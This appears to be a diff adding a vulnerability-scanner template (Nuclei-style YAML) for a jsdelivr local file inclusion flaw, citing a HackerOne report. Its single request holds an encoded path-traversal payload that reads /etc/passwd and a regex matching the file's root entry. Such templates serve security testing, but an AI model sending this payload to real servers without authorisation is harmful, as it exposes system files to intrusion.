@@ -1,0 +1,20 @@
+id: jsdelivr-lfi
+
+info:
+  name: jsdelivr LFI https://hackerone.com/reports/18371
+  author: osamahamad
+  severity: high
+  description: disclosure of etc passwd
+  tags: lfi,generic
+
+requests:
+  - method: GET
+
+    path:
+      - '/..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/etc/passwd'
+
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+        part: body
